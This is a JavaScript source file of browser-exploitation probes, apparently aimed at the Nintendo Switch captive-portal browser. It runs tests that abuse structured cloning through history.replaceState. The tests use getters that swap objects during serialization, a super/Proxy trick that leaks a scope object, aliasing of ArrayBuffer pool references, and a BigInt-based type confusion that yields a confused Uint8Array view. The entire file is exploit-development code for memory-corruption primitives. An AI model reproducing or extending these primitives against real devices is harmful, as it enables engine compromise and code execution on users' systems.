// SC getter TOCTOU + scope chain — NO Workers (they hang on Switch captive portal)
(function() {
'use strict';

var results = { tests: [] };

function test(name, fn) {
  try {
    var r = fn();
    r.name = name;
    results.tests.push(r);
  } catch(e) {
    results.tests.push({ name: name, error: e.message });
  }
}

function f64ToHex(v) {
  var buf = new ArrayBuffer(8);
  new Float64Array(buf)[0] = v;
  var u = new Uint32Array(buf);
  return '0x' + u[1].toString(16).padStart(8,'0') + u[0].toString(16).padStart(8,'0');
}

function getScope() {
  var L = class { leak() { return super.foo; } };
  L.prototype.__proto__ = new Proxy({}, {
    get: function(t, p, r) { return r; }
  });
  var lk = L.prototype.leak;
  return (function() { return lk(); })();
}

// ─── Test 1: Can scope object survive structured clone? ───
test('scope_sc', function() {
  var scope = getScope();
  if (!scope) return { result: 'no_scope' };

  try {
    history.replaceState({ s: scope, x: 42 }, '');
    var c = history.state;
    history.replaceState(null, '');
    return {
      result: 'cloned',
      hasS: !!c.s,
      sType: typeof c.s,
      sProps: c.s ? Object.getOwnPropertyNames(c.s).slice(0, 5) : [],
      x: c.x
    };
  } catch(e) {
    return { result: 'error', msg: e.message.substring(0, 80) };
  }
});

// ─── Test 2: Getter swaps buffer with scope object ───
test('buf_to_scope', function() {
  var scope = getScope();
  if (!scope) return { result: 'no_scope' };

  var buf = new ArrayBuffer(64);
  new Uint8Array(buf).fill(0xAA);

  var swapped = false;
  var trigger = {};
  Object.defineProperty(trigger, 'go', {
    get: function() {
      if (!swapped) { swapped = true; data[1] = scope; }
      return 1;
    },
    enumerable: true
  });

  var data = [trigger, buf, new Uint8Array(buf)];

  try {
    history.replaceState(data, '');
    var c = history.state;
    history.replaceState(null, '');
    if (!c) return { result: 'null', swapped: swapped };

    return {
      result: 'swap_test',
      swapped: swapped,
      item1_type: typeof c[1],
      item1_isAB: c[1] instanceof ArrayBuffer,
      item2_type: typeof c[2],
      item2_isU8: c[2] instanceof Uint8Array,
      item2_len: c[2] instanceof Uint8Array ? c[2].byteLength : -1,
      item2_bufLen: c[2] instanceof Uint8Array ? c[2].buffer.byteLength : -1,
      item2_byte0: c[2] instanceof Uint8Array ? c[2][0] : -1
    };
  } catch(e) {
    return { result: 'error', msg: e.message.substring(0, 80), swapped: swapped };
  }
});

// ─── Test 3: Pool alias via getter — make two slots reference same buffer ───
test('pool_alias', function() {
  var buf1 = new ArrayBuffer(64);
  new Uint8Array(buf1).fill(0x11);
  var buf2 = new ArrayBuffer(64);
  new Uint8Array(buf2).fill(0x22);
  var view_buf2 = new Uint8Array(buf2);

  var swapped = false;
  var trigger = {};
  Object.defineProperty(trigger, 'x', {
    get: function() {
      if (!swapped) { swapped = true; data[2] = buf1; }
      return 1;
    },
    enumerable: true
  });

  // Order: buf1 serialized first → pool P
  // trigger fires → data[2] becomes buf1
  // data[2] = buf1 already in pool → back-ref to P
  // view_buf2 references original buf2 → serializes buf2 inline
  var data = [buf1, trigger, buf2, view_buf2];

  try {
    history.replaceState(data, '');
    var c = history.state;
    history.replaceState(null, '');
    if (!c) return { result: 'null', swapped: swapped };

    return {
      result: 'alias_test',
      swapped: swapped,
      slot0_byte0: c[0] instanceof ArrayBuffer ? new Uint8Array(c[0])[0] : -1,
      slot2_byte0: c[2] instanceof ArrayBuffer ? new Uint8Array(c[2])[0] : -1,
      aliased: c[0] === c[2],
      view_byte0: c[3] instanceof Uint8Array ? c[3][0] : -1,
      view_buf_is_slot0: c[3] instanceof Uint8Array ? c[3].buffer === c[0] : false,
      view_buf_is_slot2: c[3] instanceof Uint8Array ? c[3].buffer === c[2] : false
    };
  } catch(e) {
    return { result: 'error', msg: e.message.substring(0, 80), swapped: swapped };
  }
});

// ─── Test 4: Getter replaces view with a view of a DIFFERENT-SIZE buffer ───
// buf1 (64) serialized → pool P. Getter replaces view_buf2(128) with view_buf1(64).
// Serializer sees view_buf1 → buf1 already in pool → back-ref to P.
// But what if we DON'T replace the view, just its parent array slot?
// The serializer reads data[2] AFTER getter → sees the new view
test('view_size_mismatch', function() {
  var buf1 = new ArrayBuffer(64);
  new Uint8Array(buf1).fill(0x11);

  var buf2 = new ArrayBuffer(128);
  new Uint8Array(buf2).fill(0x22);
  var view2 = new Uint8Array(buf2); // length 128

  var swapped = false;
  var trigger = {};
  Object.defineProperty(trigger, 'x', {
    get: function() {
      if (!swapped) {
        swapped = true;
        // Replace view2 with a view of buf1
        data[2] = new Uint8Array(buf1);
      }
      return 1;
    },
    enumerable: true
  });

  var data = [buf1, trigger, view2];

  try {
    history.replaceState(data, '');
    var c = history.state;
    history.replaceState(null, '');
    if (!c) return { result: 'null', swapped: swapped };

    var v = c[2];
    if (!(v instanceof Uint8Array)) return { result: 'not_u8', type: typeof v };

    return {
      result: 'size_test',
      swapped: swapped,
      view_len: v.length,
      view_bufLen: v.buffer.byteLength,
      view_byte0: v[0],
      buf_same: v.buffer === c[0]
    };
  } catch(e) {
    return { result: 'error', msg: e.message.substring(0, 80), swapped: swapped };
  }
});

// ─── Test 5: BigInt confusion + getter combo ───
// Use getter to add/remove BigInts from filler during SC, changing the shift
test('bigint_getter_combo', function() {
  var target = new ArrayBuffer(64);
  new Uint8Array(target).fill(0xEE);
  var source = new ArrayBuffer(64);
  new Uint8Array(source).fill(0xFF);
  var v1 = new Uint8Array(source);
  var v2 = new Uint8Array(source);

  var triggered = false;
  var trigger = {};
  Object.defineProperty(trigger, 'x', {
    get: function() {
      if (!triggered) {
        triggered = true;
        // Remove the BigInt from filler to eliminate the shift
        // Or add more BigInts to increase the shift
        filler[0] = 'not_a_bigint'; // Replace 1n with a string
      }
      return 1;
    },
    enumerable: true
  });

  // Layout: [1n, trigger, target, v1, v2, ...]
  // Serializer: 1n serialized (shift=1 in pool), then trigger fires → filler[0] changed
  // But 1n is ALREADY serialized! The change to filler[0] is too late for the pool.
  var filler = [1n, trigger, target, v1, v2];
  while (filler.length < 80) filler.push({ p: filler.length });
  var ref = {};
  var outer = new Array(83);
  outer[0] = filler;
  outer[1] = ref;
  outer[2] = ref;
  outer[82] = -1;

  try {
    history.replaceState(outer, '');
    var c = history.state;
    history.replaceState(null, '');
    if (!c) return { result: 'null', triggered: triggered };

    var f = c[0];
    // Find views
    var views = [];
    for (var i = 0; i < Math.min(10, f.length); i++) {
      if (f[i] instanceof Uint8Array) {
        views.push({ idx: i, byte0: f[i][0], len: f[i].length, bufLen: f[i].buffer.byteLength });
      }
    }

    // Check outer[1] vs outer[2] for mismatch
    var mismatch = c[1] !== c[2];

    return {
      result: 'bigint_getter',
      triggered: triggered,
      views: views,
      mismatch: mismatch,
      fillerItem0: typeof f[0] + ':' + String(f[0]).substring(0, 20)
    };
  } catch(e) {
    return { result: 'error', msg: e.message.substring(0, 80), triggered: triggered };
  }
});

// ─── Test 6: Deep scope inspection ───
test('scope_deep', function() {
  var scope = (function() {
    var localBuf = new ArrayBuffer(32);
    var localArr = [1.1, 2.2, { ptr: 0x41 }];
    var localNum = 0xDEADBEEF;

    var L = class { leak() { return super.foo; } };
    L.prototype.__proto__ = new Proxy({}, {
      get: function(t, p, r) { return r; }
    });
    return L.prototype.leak();
  })();

  if (!scope) return { result: 'no_scope' };

  var props = [];
  try {
    var names = Object.getOwnPropertyNames(scope);
    for (var i = 0; i < names.length; i++) {
      var v = scope[names[i]];
      props.push({
        n: names[i],
        t: typeof v,
        ab: v instanceof ArrayBuffer,
        fn: typeof v === 'function',
        num: typeof v === 'number' ? v : undefined,
        preview: typeof v === 'object' && v !== null ? v.constructor ? v.constructor.name : '?' : undefined
      });
    }
  } catch(e) {}

  // Can we WRITE to scope and have it affect the function's locals?
  var writeTest = null;
  try {
    if (scope.localNum !== undefined) {
      var before = scope.localNum;
      scope.localNum = 42;
      writeTest = { before: before, after: scope.localNum, changed: scope.localNum === 42 };
    }
  } catch(e) { writeTest = { error: e.message }; }

  // Is scope extensible?
  var extensible = false;
  try { extensible = Object.isExtensible(scope); } catch(e) {}

  // Can we seal/freeze it?
  var sealable = false;
  try {
    Object.seal(scope);
    sealable = true;
  } catch(e) {}

  return {
    result: 'scope_deep',
    propCount: props.length,
    props: props,
    writeTest: writeTest,
    extensible: extensible,
    sealable: sealable
  };
});

// ─── Test 7: Use scope + confused buffer together ───
// Store scope in the SC filler alongside the BigInt confusion
test('scope_plus_confusion', function() {
  var scope = getScope();
  if (!scope) return { result: 'no_scope' };

  var target = new ArrayBuffer(64);
  new Uint8Array(target).fill(0xAA);
  var source = new ArrayBuffer(64);
  new Uint8Array(source).fill(0xBB);
  var v1 = new Uint8Array(source);
  var v2 = new Uint8Array(source);

  // Put scope in the filler — if SC can clone it, interesting things might happen
  var filler = [1n, target, v1, v2, scope];
  while (filler.length < 80) filler.push({ p: filler.length });
  var ref = {};
  var outer = new Array(83);
  outer[0] = filler;
  outer[1] = ref;
  outer[2] = ref;
  outer[82] = -1;

  try {
    history.replaceState(outer, '');
    var c = history.state;
    history.replaceState(null, '');
    if (!c) return { result: 'null' };

    var cv = c[0][3]; // confused view
    var clonedScope = c[0][4];

    var info = {
      confused: cv instanceof Uint8Array ? cv[0] === 0xAA : false,
      scopeCloned: !!clonedScope,
      scopeType: typeof clonedScope,
      mismatch: c[1] !== c[2]
    };

    if (clonedScope && typeof clonedScope === 'object') {
      info.scopeProps = Object.getOwnPropertyNames(clonedScope).slice(0, 5);
    }

    info.result = 'combo';
    return info;
  } catch(e) {
    return { result: 'error', msg: e.message.substring(0, 80) };
  }
});

return JSON.stringify(results);
})();
